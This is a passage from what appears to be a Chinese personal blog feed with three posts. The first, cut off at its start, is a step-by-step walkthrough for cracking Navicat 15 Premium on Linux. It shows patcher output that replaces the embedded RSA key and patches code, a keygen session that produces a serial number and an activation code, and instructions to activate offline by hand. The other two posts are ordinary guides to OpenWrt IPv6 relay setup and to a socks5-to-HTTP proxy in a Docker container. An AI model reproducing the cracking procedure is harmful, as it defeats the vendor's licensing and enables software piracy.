class="hljs-number">64</span> <span class="hljs-number">46</span>  <span class="hljs-number">0</span>gi5RATceD0DTZdF+<span class="hljs-number">0x0000000002a256c0</span>  <span class="hljs-number">2f</span> <span class="hljs-number">4</span>d <span class="hljs-number">74</span> <span class="hljs-number">32</span> <span class="hljs-number">64</span> <span class="hljs-number">6</span>b <span class="hljs-number">6</span>c <span class="hljs-number">57</span> <span class="hljs-number">77</span> <span class="hljs-number">4</span>d <span class="hljs-number">66</span> <span class="hljs-number">47</span> <span class="hljs-number">69</span> <span class="hljs-number">33</span> <span class="hljs-number">5</span>a <span class="hljs-number">74</span>  /Mt2dklWwMfGi3Zt+<span class="hljs-number">0x0000000002a256d0</span>  <span class="hljs-number">6</span>b <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">78</span> <span class="hljs-number">62</span> <span class="hljs-number">6</span>e <span class="hljs-number">6f</span> <span class="hljs-number">66</span> <span class="hljs-number">2f</span> <span class="hljs-number">62</span> <span class="hljs-number">79</span> <span class="hljs-number">44</span> <span class="hljs-number">43</span> <span class="hljs-number">45</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span>  k3Axbnof/byDCEer+<span class="hljs-number">0x0000000002a256e0</span>  <span class="hljs-number">69</span> <span class="hljs-number">51</span> <span class="hljs-number">37</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">43</span> <span class="hljs-number">45</span> <span class="hljs-number">62</span> <span class="hljs-number">31</span> <span class="hljs-number">72</span> <span class="hljs-number">50</span> <span class="hljs-number">71</span> <span class="hljs-number">69</span> <span class="hljs-number">56</span> <span class="hljs-number">6</span>d <span class="hljs-number">58</span>  iQ79bCEb1rPqiVmX+<span class="hljs-number">0x0000000002a256f0</span>  <span class="hljs-number">48</span> <span class="hljs-number">35</span> <span class="hljs-number">34</span> <span class="hljs-number">77</span> <span class="hljs-number">77</span> <span class="hljs-number">53</span> <span class="hljs-number">2f</span> <span class="hljs-number">36</span> <span class="hljs-number">6</span>b <span class="hljs-number">4</span>d <span class="hljs-number">38</span> <span class="hljs-number">64</span> <span class="hljs-number">2</span>b <span class="hljs-number">72</span> <span class="hljs-number">51</span> <span class="hljs-number">57</span>  H54wwS/<span class="hljs-number">6</span>kM8d+rQW+<span class="hljs-number">0x0000000002a25700</span>  <span class="hljs-number">2f</span> <span class="hljs-number">78</span> <span class="hljs-number">78</span> <span class="hljs-number">36</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">6</span>e <span class="hljs-number">64</span> <span class="hljs-number">6f</span> <span class="hljs-number">38</span> <span class="hljs-number">4</span>a <span class="hljs-number">76</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">50</span> <span class="hljs-number">59</span>  /xx6WWndo8JvasPY+<span class="hljs-number">0x0000000002a25710</span>  <span class="hljs-number">41</span> <span class="hljs-number">70</span> <span class="hljs-number">52</span> <span class="hljs-number">6</span>a <span class="hljs-number">57</span> <span class="hljs-number">39</span> <span class="hljs-number">6</span>d <span class="hljs-number">6f</span> <span class="hljs-number">78</span> <span class="hljs-number">6</span>e <span class="hljs-number">4f</span> <span class="hljs-number">54</span> <span class="hljs-number">34</span> <span class="hljs-number">79</span> <span class="hljs-number">6</span>c <span class="hljs-number">7</span>a  ApRjW9moxnOT4ylz+<span class="hljs-number">0x0000000002a25720</span>  <span class="hljs-number">76</span> <span class="hljs-number">6</span>a <span class="hljs-number">77</span> <span class="hljs-number">2f</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">41</span> <span class="hljs-number">4</span>e <span class="hljs-number">77</span> <span class="hljs-number">30</span> <span class="hljs-number">64</span> <span class="hljs-number">50</span> <span class="hljs-number">66</span> <span class="hljs-number">4</span>e <span class="hljs-number">71</span>  vjw/AMzANw0dPfNq+<span class="hljs-number">0x0000000002a25730</span>  <span class="hljs-number">52</span> <span class="hljs-number">74</span> <span class="hljs-number">64</span> <span class="hljs-number">59</span> <span class="hljs-number">63</span> <span class="hljs-number">4f</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">49</span> <span class="hljs-number">76</span> <span class="hljs-number">50</span> <span class="hljs-number">33</span> <span class="hljs-number">50</span> <span class="hljs-number">76</span> <span class="hljs-number">77</span> <span class="hljs-number">46</span>  RtdYcOflIvP3PvwF+<span class="hljs-number">0x0000000002a25740</span>  <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">59</span> <span class="hljs-number">71</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">6</span>d <span class="hljs-number">6</span>b <span class="hljs-number">37</span> <span class="hljs-number">4</span>c <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">66</span> <span class="hljs-number">42</span> <span class="hljs-number">71</span> <span class="hljs-number">55</span>  haYqb9mk7LhnfBqU+<span class="hljs-number">0x0000000002a25750</span>  <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">66</span> <span class="hljs-number">4</span>b <span class="hljs-number">77</span> <span class="hljs-number">6</span>e <span class="hljs-number">50</span> <span class="hljs-number">77</span> <span class="hljs-number">74</span> <span class="hljs-number">6</span>e <span class="hljs-number">43</span> <span class="hljs-number">2</span>b <span class="hljs-number">67</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>c <span class="hljs-number">38</span>  F4fKwnPwtnC+g2L8+<span class="hljs-number">0x0000000002a25760</span>  <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">67</span> <span class="hljs-number">50</span> <span class="hljs-number">6</span>c <span class="hljs-number">48</span> <span class="hljs-number">51</span> <span class="hljs-number">62</span> <span class="hljs-number">4</span>e <span class="hljs-number">49</span> <span class="hljs-number">4f</span> <span class="hljs-number">75</span> <span class="hljs-number">78</span> <span class="hljs-number">50</span> <span class="hljs-number">37</span> <span class="hljs-number">6</span>b  V2gPlHQbNIOuxP7k+<span class="hljs-number">0x0000000002a25770</span>  <span class="hljs-number">72</span> <span class="hljs-number">58</span> <span class="hljs-number">36</span> <span class="hljs-number">6</span>c <span class="hljs-number">72</span> <span class="hljs-number">65</span> <span class="hljs-number">45</span> <span class="hljs-number">6</span>e <span class="hljs-number">31</span> <span class="hljs-number">76</span> <span class="hljs-number">4</span>b <span class="hljs-number">36</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">33</span> <span class="hljs-number">64</span>  rX6lreEn1vK6E03d+<span class="hljs-number">0x0000000002a25780</span>  <span class="hljs-number">6f</span> <span class="hljs-number">56</span> <span class="hljs-number">31</span> <span class="hljs-number">5</span>a <span class="hljs-number">47</span> <span class="hljs-number">73</span> <span class="hljs-number">37</span> <span class="hljs-number">34</span> <span class="hljs-number">5</span>a <span class="hljs-number">59</span> <span class="hljs-number">77</span> <span class="hljs-number">63</span> <span class="hljs-number">51</span> <span class="hljs-number">47</span> <span class="hljs-number">63</span> <span class="hljs-number">62</span>  oV1ZGs74ZYwcQGcb+<span class="hljs-number">0x0000000002a25790</span>  <span class="hljs-number">37</span> <span class="hljs-number">52</span> <span class="hljs-number">46</span> <span class="hljs-number">50</span> <span class="hljs-number">74</span> <span class="hljs-number">2f</span> <span class="hljs-number">67</span> <span class="hljs-number">56</span> <span class="hljs-number">41</span> <span class="hljs-number">54</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">2f</span> <span class="hljs-number">45</span> <span class="hljs-number">38</span> <span class="hljs-number">43</span>  <span class="hljs-number">7</span>RFPt/gVATzN/E8C+<span class="hljs-number">0x0000000002a257a0</span>  <span class="hljs-number">49</span> <span class="hljs-number">4</span>c <span class="hljs-number">42</span> <span class="hljs-number">71</span> <span class="hljs-number">38</span> <span class="hljs-number">70</span> <span class="hljs-number">42</span> <span class="hljs-number">74</span> <span class="hljs-number">4f</span> <span class="hljs-number">31</span> <span class="hljs-number">39</span> <span class="hljs-number">43</span> <span class="hljs-number">70</span> <span class="hljs-number">76</span> <span class="hljs-number">34</span> <span class="hljs-number">34</span>  ILBq8pBtO19Cpv44+<span class="hljs-number">0x0000000002a257b0</span>  <span class="hljs-number">63</span> <span class="hljs-number">76</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">66</span> <span class="hljs-number">42</span> <span class="hljs-number">44</span> <span class="hljs-number">4</span>c <span class="hljs-number">39</span> <span class="hljs-number">71</span> <span class="hljs-number">35</span> <span class="hljs-number">55</span> <span class="hljs-number">61</span> <span class="hljs-number">75</span> <span class="hljs-number">53</span>  cvXY2fBDL9q5UauS+<span class="hljs-number">0x0000000002a257c0</span>  <span class="hljs-number">34</span> <span class="hljs-number">64</span> <span class="hljs-number">71</span> <span class="hljs-number">76</span> <span class="hljs-number">49</span> <span class="hljs-number">39</span> <span class="hljs-number">45</span> <span class="hljs-number">6</span>a <span class="hljs-number">41</span> <span class="hljs-number">6</span>a <span class="hljs-number">46</span> <span class="hljs-number">52</span> <span class="hljs-number">76</span> <span class="hljs-number">77</span> <span class="hljs-number">49</span> <span class="hljs-number">44</span>  <span class="hljs-number">4</span>dqvI9EjAjFRvwID+<span class="hljs-number">0x0000000002a257d0</span>  <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> ad de ef be                          AQAB....        [*] Previous:+<span class="hljs-number">0x000000000141fbf0</span>  <span class="hljs-number">44</span> <span class="hljs-number">0f</span> b6 <span class="hljs-number">24</span> <span class="hljs-number">18</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">28</span> <span class="hljs-number">8</span>b <span class="hljs-number">50</span> f8 <span class="hljs-number">85</span> d2 <span class="hljs-number">79</span>  D..$.H.D$(.P...y+<span class="hljs-number">0x000000000141fc00</span>  <span class="hljs-number">6f</span>                                               o               [*] After:+<span class="hljs-number">0x000000000141fbf0</span>  <span class="hljs-number">45</span> <span class="hljs-number">31</span> e4 <span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">05</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>a <span class="hljs-number">60</span> <span class="hljs-number">01</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span>  E1.H..RZ`.......+<span class="hljs-number">0x000000000141fc00</span>  <span class="hljs-number">90</span>                                               .               [*] New RSA<span class="hljs-number">-2048</span> <span class="hljs-keyword">private</span> key has been saved to    /home/hksanduo/Downloads/navicat-keygen/RegPrivateKey.pem********************************************************           PATCH HAS BEEN DONE SUCCESSFULLY!         **                  HAVE FUN AND ENJOY~                ********************************************************</code></pre><h3 id="将文件重新打包成AppImage"><a href="#将文件重新打包成AppImage" class="headerlink" title="将文件重新打包成AppImage"></a>将文件重新打包成AppImage</h3><p>具体指令可以参考以下：</p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wget <span class="hljs-string">'https://github.com/AppImage/AppImageKit/releases/download/continuous/appimagetool-x86_64.AppImage'</span><span class="hljs-variable">$ </span>chmod +x appimagetool-x86_64.AppImage<span class="hljs-variable">$ </span>./appimagetool-x86_64.AppImage ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched.AppImage</code></pre><h3 id="运行刚生成的AppImage："><a href="#运行刚生成的AppImage：" class="headerlink" title="运行刚生成的AppImage："></a>运行刚生成的AppImage：</h3><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>chmod +x ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched.AppImage<span class="hljs-variable">$ </span>~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched.AppImage</code></pre><h3 id="使用-navicat-keygen-来生成-序列号-和-激活码。"><a href="#使用-navicat-keygen-来生成-序列号-和-激活码。" class="headerlink" title="使用 navicat-keygen 来生成 序列号 和 激活码。"></a>使用 navicat-keygen 来生成 序列号 和 激活码。</h3><pre><code class="hljs vbnet">Usage:    navicat-keygen &lt;--bin|--<span class="hljs-keyword">text</span>&gt; [--adv] &lt;RSA<span class="hljs-number">-2048</span> <span class="hljs-keyword">Private</span> <span class="hljs-keyword">Key</span> File&gt;        &lt;--bin|--<span class="hljs-keyword">text</span>&gt;    Specify <span class="hljs-string">"--bin"</span> <span class="hljs-keyword">to</span> generate <span class="hljs-string">"license_file"</span> used <span class="hljs-keyword">by</span> Navicat <span class="hljs-number">11.</span>                          Specify <span class="hljs-string">"--text"</span> <span class="hljs-keyword">to</span> generate base64-encoded activation code.                          This parameter must be specified.        [--adv]                       Enable advance mode.                                      This parameter <span class="hljs-keyword">is</span> <span class="hljs-keyword">optional</span>.        &lt;RSA<span class="hljs-number">-2048</span> <span class="hljs-keyword">Private</span> <span class="hljs-keyword">Key</span> File&gt;   A path <span class="hljs-keyword">to</span> an RSA<span class="hljs-number">-2048</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">key</span> file.                                      This parameter must be specified.</code></pre><p>例如：</p><pre><code class="hljs jboss-cli">$ <span class="hljs-string">./bin/navicat-keygen</span> <span class="hljs-params">--text</span> <span class="hljs-string">./RegPrivateKey.pem</span></code></pre><p>你会被要求选择Navicat产品类别、Navicat语言版本和填写主版本号。之后一个随机生成的 序列号 将会给出。</p><pre><code class="hljs markdown">$ ./bin/navicat-keygen --text ./RegPrivateKey.pem<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-emphasis">***</span><span class="hljs-bullet">*       </span>Navicat Keygen (Linux) by @DoubleLabyrinth       *<span class="hljs-bullet">*                   </span>Version: 1.0                         *<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-emphasis">***</span>[*] Select Navicat product:<span class="hljs-bullet">0. </span>DataModeler<span class="hljs-bullet">1. </span>Premium<span class="hljs-bullet">2. </span>MySQL<span class="hljs-bullet">3. </span>PostgreSQL<span class="hljs-bullet">4. </span>Oracle<span class="hljs-bullet">5. </span>SQLServer<span class="hljs-bullet">6. </span>SQLite<span class="hljs-bullet">7. </span>MariaDB<span class="hljs-bullet">8. </span>MongoDB<span class="hljs-bullet">9. </span>ReportViewer(Input index)&gt; 1[*] Select product language:<span class="hljs-bullet">0. </span>English<span class="hljs-bullet">1. </span>Simplified Chinese<span class="hljs-bullet">2. </span>Traditional Chinese<span class="hljs-bullet">3. </span>Japanese<span class="hljs-bullet">4. </span>Polish<span class="hljs-bullet">5. </span>Spanish<span class="hljs-bullet">6. </span>French<span class="hljs-bullet">7. </span>German<span class="hljs-bullet">8. </span>Korean<span class="hljs-bullet">9. </span>Russian<span class="hljs-bullet">10. </span>Portuguese(Input index)&gt; 0[*] Input major version number:(range: 0 ~ 15, default: 12)&gt; 15[*] Serial number:NAVM-RTVJ-EO42-IODD[*] Your name:你可以使用这个 序列号 来暂时激活Navicat。之后你会被要求填写 用户名 和 组织名。你可以随意填写，但别太长。[*] Your name: DoubleLabyrinth[*] Your organization: DoubleLabyrinth[*] Input request code in Base64: (Double press ENTER to end)之后你会被要求填写请求码。注意不要关闭keygen。断开网络. 找到注册窗口，填写keygen给你的 序列号，然后点击 激活。通常在线激活会失败，所以在弹出的提示中选择 手动激活。复制 请求码 到keygen，连按两次回车结束。[*] Input request code in Base64: (Double press ENTER to end)OaGPC3MNjJ/pINbajFzLRkrV2OaSXYLr2tNLDW0fIthPOJQFXr84OOroCY1XN8R2xl2j7epZ182PL6q+BRaSC6hnHev/cZwhq/4LFNcLu0T0D/QUhEEBJl4QzFr8TlFSYI1qhWGLIxkGZggA8vMLMb/sLHYn9QebBigvleP9dNCS4sO82bilFrKFUtq3ch8r7V3mbcbXJCfLhXgrHRvT2FV/s1BFuZzuWZUujxlp37U6Y2PFD8fQgsgBUwrxYbF0XxnXKbCmvtgh2yaB3w9YnQLoDiipKp7io1IxEFMYHCpjmfTGk4WU01mSbdi2OS/wm9pq2Y62xvwawsq1WQJoMg==[*] Request Info:&#123;"K":"NAVMRTVJEO42IODD", "DI":"4A12F84C6A088104D23E", "P":"linux"&#125;[*] Response Info:&#123;"K":"NAVMRTVJEO42IODD","DI":"4A12F84C6A088104D23E","N":"DoubleLabyrinth","O":"DoubleLabyrinth","T":1575543648&#125;[*] Activation Code:i45HIr7T1g69Cm9g3bN1DBpM/Zio8idBw3LOFGXFQjXj0nPfy9yRGuxaUBQkWXSOWa5EAv7S9Z1sljlkZP6cKdfDGYsBb/4N1W5Oj1qogzNtRo5LGwKe9Re3zPY3SO8RXACfpNaKjdjpoOQa9GjQ/igDVH8r1k+Oc7nEnRPZBm0w9aJIM9kS42lbjynVuOJMZIotZbk1NloCodNyRQw3vEEP7kq6bRZsQFp2qF/mr+hIPH8lo/WF3hh+2NivdrzmrKKhPnoqSgSsEttL9a6ueGOP7Io3j2lAFqb9hEj1uC3tPRpYcBpTZX7GAloAENSasFwMdBIdszifDrRW42wzXw==</code></pre><p>最终你会得到一个base64编码的 激活码。将之复制到 手动激活 的窗口，然后点击 <strong>激活</strong>。如果没有什么意外，应该可以成功激活。</p><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>rm ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en.AppImage<span class="hljs-variable">$ </span>rm -rf ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched<span class="hljs-variable">$ </span>mv ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched.AppImage ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en.AppImage</code></pre><h2 id="后续使用"><a href="#后续使用" class="headerlink" title="后续使用"></a>后续使用</h2><p>你可以将激活的navicat15放置于/opt目录下或者/usr/local/share目录下，设置一个软连接，方便在终端及命令行调用，我的navicat15-premium-en.AppImage放置的目录为：/usr/local/share/,使用以下命令建立软连接</p><pre><code class="hljs awk">sudo chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>navicat15-premium-en.AppImagesudo ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>navicat15-premium-en.AppImage <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>navicat15</code></pre><p><img src="https://hksanduo.github.io/images/20200323-crack-navicat-15-for-linux.png" srcset="/img/loading.gif" alt="20200323-crack-navicat-15-for-linux.png"></p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://gitee.com/yangzhuoming/navicat-keygen" target="_blank" rel="noopener">https://gitee.com/yangzhuoming/navicat-keygen</a></li><li><a href="https://github.com/DoubleLabyrinth/navicat-keygen.git" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/navicat-keygen.git</a></li><li><a href="https://github.com/AppImage/AppImageKit/" target="_blank" rel="noopener">https://github.com/AppImage/AppImageKit/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openwrt 配置ipv6</title>
    <link href="/2020/03/13/2020-03-13-openwrt-set-ipv6/"/>
    <url>/2020/03/13/2020-03-13-openwrt-set-ipv6/</url>
    
    <content type="html"><![CDATA[<p>openwrt 配置ipv6</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前一直只有教育网或者局部地区测试的IPv6现在已经大范围推开，大部分地区的ISP均正确部署了IPv6。通常来说，Openwrt获取IPv6的方式有三种：中继、穿透和NAT，由于ISP已经提供了IPv6和某些方案的缺陷，择优采取中继的方案。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先将光猫的模式调为桥接或者混合模式，然后通过电脑拨号确认ISP是否已经正确配置IPv6。<br>然后升级路由器的Openwrt的版本，最好不要低于17.01，否则odhcpd可能会出现问题，当然更老的版本也能正确获取IPv6，不过可能需要每隔一段时间就重启一次odhcpd。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>从Openwrt 15.xx（即CC版本）开始，默认的初始设置中就会含有wan6，无需安装其它软件包。<br>由于Openwrt默认分配IPv6私网网段，首先应该删除网络&gt;接口页面内IPv6 ULA 前缀配置自动生成的fd开头的/64随机IPv6地址段并保存生效。其实这个时候，在较新版本的Openwrt上面应该已经成功获取了IPv6。<br>然后我们需要修改/etc/config/dhcp文件，使用无状态地址自动配置（SLAAC）IPv6，而不是DHCPv6。<br>为了保险期间，首先需要备份dhcp配置文件，以便遇到问题进行回滚。</p><pre><code class="hljs awk">cp <span class="hljs-regexp">/etc/</span>config<span class="hljs-regexp">/dhcp /</span>etc<span class="hljs-regexp">/config/</span>dhcp.backup</code></pre><p>然后修改dhcp的配置示例如下：</p><pre><code class="hljs routeros">config dhcp <span class="hljs-string">'lan'</span>        option<span class="hljs-built_in"> interface </span><span class="hljs-string">'lan'</span>        option start <span class="hljs-string">'100'</span>        option limit <span class="hljs-string">'150'</span>        option leasetime <span class="hljs-string">'12h'</span>        option dhcpv6 <span class="hljs-string">'relay'</span>        option ra <span class="hljs-string">'relay'</span>        option ndp <span class="hljs-string">'relay'</span>        option ra_management <span class="hljs-string">'1'</span>config dhcp <span class="hljs-string">'wan'</span>        option<span class="hljs-built_in"> interface </span><span class="hljs-string">'wan'</span>        option ignore <span class="hljs-string">'1'</span>        option dhcpv6 <span class="hljs-string">'disabled'</span>        option ndp <span class="hljs-string">'relay'</span>        option ra <span class="hljs-string">'relay'</span>        option master <span class="hljs-string">'1'</span>config dhcp <span class="hljs-string">'wan6'</span>        option dhcpv6 <span class="hljs-string">'relay'</span>        option ra <span class="hljs-string">'relay'</span>        option ndp <span class="hljs-string">'relay'</span>        option master <span class="hljs-string">'1'</span></code></pre><p>配置完成之后需要重启network服务，以便接入终端获取IPv6地址：</p><pre><code class="hljs routeros">/etc/init.d<span class="hljs-built_in">/network </span>restart</code></pre><p>至此所有的客户端包括路由器均可获得可用的IPv6地址，不过在部分操作系统上dhcp不会马上获取到ipv6，需要手动刷新一下：<br>Windows下面，需要在CMD中执行如下命令：</p><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /release6<span class="hljs-built_in">ipconfig</span> /renew6</code></pre><p>在Linux下面，可以重启dhcp或者NetworkManager服务</p><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart dhcpcd</span></code></pre><p>或者</p><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart NetworkManager</span></code></pre><p>每个发行版本重启网络的方式不一样，请根据实际情况刷新网络<br><img src="https://hksanduo.github.io/images/20200313-ip-addr.png" srcset="/img/loading.gif" alt="20200313-ip-addr.png"></p><h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><p>体验较好，可以访问ipv6站点。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="http://blog.kompaz.win/2017/02/22/OpenWRT%20IPv6%20%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">http://blog.kompaz.win/2017/02/22/OpenWRT%20IPv6%20%E9%85%8D%E7%BD%AE/</a></li><li><a href="https://openwrt.org/docs/guide-user/network/ipv6/start" target="_blank" rel="noopener">https://openwrt.org/docs/guide-user/network/ipv6/start</a></li><li><a href="https://linkthis.me/2018/12/04/ipv6-on-openwrt/" target="_blank" rel="noopener">https://linkthis.me/2018/12/04/ipv6-on-openwrt/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
      <tag>Openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker容器使用socks5做全局代理</title>
    <link href="/2020/03/07/2020-03-07-docker-container-use-socks5-proxy/"/>
    <url>/2020/03/07/2020-03-07-docker-container-use-socks5-proxy/</url>
    
    <content type="html"><![CDATA[<p>docker容器使用socks5做全局代理</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>博主自行构建ubuntu容器来编译openwrt，部分组件构建需要获取墙外资源，博主使用的代理工具，支持的协议<br>为socks5，但是容器中部分工具如：<strong>wget</strong> 只支持http代理，所以在容器中需要配置socks5转http全局代理。  </p><h2 id="宿主机代理配置"><a href="#宿主机代理配置" class="headerlink" title="宿主机代理配置"></a>宿主机代理配置</h2><p>需要修改宿主机代理客户端配置，方便局域网其他主机连接代理，容器使用的网络类型为桥接。之前也使用过host网<br>络，但是在容器中测试并未成功。为了能迅速编译openwrt，只能使用默认桥接网络进行代理。     </p><p>首先配置客户端，允许局域网中其他主机进行连接，我这里直接配置成“0.0.0.0”，虽说这个不安全，但是在局域网中<br>风险暂时可以接受。这里需要注意，需要使用firewalld或者iptables启用本地代理端口。firewalld配置指令如下：</p><pre><code class="hljs livecodeserver">firewall-cmd <span class="hljs-comment">--permanent --add-port=6666/tcp</span>```    个人本地代理服务器配置如下：![<span class="hljs-number">20200307</span>-proxy-client.png](<span class="hljs-keyword">https</span>://hksanduo.github.io/images/<span class="hljs-number">20200307</span>-proxy-client.png)    宿主机本地的代理端口为：<span class="hljs-number">6666</span>，未设置验证用户名和密码    可以使用局域网中其他主机测试一下，宿主机本地代理服务器是否配置成功，测试过程这里就不在赘述了。<span class="hljs-comment">## 容器构建配置</span>以下Dockerfile配置文件仅供参考，这是我为了编译openwrt自行构建的。除了openwrt编译需要的基础环境，我增加了polipo，我使用polipo这个工具进行全局代理。设置<span class="hljs-keyword">http</span>和<span class="hljs-keyword">https</span>代理地址。</code></pre><p>FROM ubuntu:latest</p><p>ENV LANG en_US.UTF-8<br>ENV LANGUAGE en_US.UTF-8</p><p>RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</p><p>RUN echo ‘Asia/Shanghai’ &gt;/etc/timezone</p><p>RUN apt-get update -qq &amp;&amp; <br>    apt-get upgrade -qqy &amp;&amp; <br>    apt-get install -qqy build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib wget iputils-ping curl polipo  &amp;&amp; <br>    apt-get clean &amp;&amp; <br>    rm -rf /tmp/* /var/tmp/*</p><p>ADD config /etc/polipo/config</p><p>ENV http_proxy “<a href="http://127.0.0.1:8183&quot;">http://127.0.0.1:8183&quot;</a><br>ENV https_proxy  “<a href="http://127.0.0.1:8183&quot;">http://127.0.0.1:8183&quot;</a></p><pre><code class="hljs plain">polipo配置文件如下：</code></pre><p>logSyslog = true<br>logFile = /var/log/polipo/polipo.log<br>socksParentProxy = “192.168.3.200:6666”<br>socksProxyType = socks5<br>proxyPort = 8183<br>proxyAddress = “0.0.0.0”<br>allowedClients = 127.0.0.1</p><pre><code class="hljs angelscript">宿主机的ip为<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.200</span>，宿主机代理服务器启用的端口为：<span class="hljs-number">6666</span>，polipo全局代理的端口为<span class="hljs-number">8183</span>   使用以下指令进行构建</code></pre><p>docker build -t openwrt-build-env .</p><pre><code class="hljs clean">## 启用容器并进行测试执行以下指令映射本地目录到容器中去</code></pre><p>docker run -itd –name openwrt-build-env -v ～/openwrt/openwrt:/home/user/openwrt openwrt-build-env</p><pre><code class="hljs plain">使用以下指令进入容器</code></pre><p>docker exec -it openwrt-build-env /bin/bash</p><pre><code class="hljs plain">使用以下指令测试代理是否成功</code></pre><p>curl cip.cc</p><pre><code>![20200307-proxy-test.png](https://hksanduo.github.io/images/20200307-proxy-test.png)显示得ip位于国外，代理成功，可以开心编译openwrt了。## 参考内容- [https://blog.denghaihui.com/2017/10/10/shadowsocks-polipo/](https://blog.denghaihui.com/2017/10/10/shadowsocks-polipo/)- [https://wiki.archlinux.org/index.php/Polipo (简体中文))](https://wiki.archlinux.org/index.php/Polipo_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))- [https://juejin.im/post/5c91ff5ee51d4534446edb9a](https://juejin.im/post/5c91ff5ee51d4534446edb9a)- [https://milkice.me/2019/08/07/docker-network-tunnel/](https://milkice.me/2019/08/07/docker-network-tunnel/)- [https://zhanghongtong.github.io/2019/06/27/Ubuntu%E5%92%8Cdocker%E4%BD%BF%E7%94%A8shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BF%BB%E5%A2%99/](https://zhanghongtong.github.io/2019/06/27/Ubuntu%E5%92%8Cdocker%E4%BD%BF%E7%94%A8shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BF%BB%E5%A2%99/)- [https://wiki.archlinux.org/index.php/Docker#Proxy_configuration](https://wiki.archlinux.org/index.php/Docker#Proxy_configuration)- 